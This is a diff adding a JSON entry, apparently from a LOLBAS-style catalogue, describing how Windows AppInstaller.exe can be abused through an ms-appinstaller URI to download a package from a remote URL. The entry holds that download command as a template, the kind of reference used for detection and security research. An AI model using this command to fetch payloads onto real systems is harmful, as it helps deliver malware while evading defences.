@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-appinstaller-exe-download",
+  "name": "LOLBAS · AppInstaller.exe (Download)",
+  "command": "start ms-appinstaller://?source={REMOTEURL:.exe}",
+  "description": "AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "appinstaller",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/AppInstaller/",
+  "upstream_id": "AppInstaller.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — AppInstaller.exe",
+      "url": "https://lolbas-project.github.io/lolbas/AppInstaller/"
+    }
+  ]
+}
